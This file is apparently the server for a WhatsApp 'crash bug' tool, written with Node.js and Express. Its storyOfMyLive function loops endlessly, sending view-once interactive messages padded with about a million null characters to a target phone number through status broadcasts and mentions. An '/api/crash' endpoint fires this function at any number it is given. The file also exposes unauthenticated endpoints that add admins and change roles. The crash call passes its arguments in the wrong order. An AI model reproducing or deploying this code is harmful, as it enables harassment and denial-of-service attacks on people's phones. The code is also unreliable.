const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
async function storyOfMyLive(sock, target, mention = true) {
try {
while (true) {
const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
nativeFlowResponseMessage: {
version: 3,
name: "call_permission_request",
paramsJson: "\u0000".repeat(1045000)
},
body: {
text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸",
format: "DEFAULT"
}
}
}
}
},
{
isForwarded: false,
ephemeralExpiration: 0,
background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
forwardingScore: 0,
font: Math.floor(Math.random() * 9)
}
)
await sock.relayMessage("status@broadcast", msg.message, {
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
],
statusJidList: [target],
messageId: msg.key.id
})
if (mention) {
await sock.relayMessage(
target,
{
statusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{}
)
}
await sleep(1500)
}
} catch (err) {}
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await storyOfMyLive(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
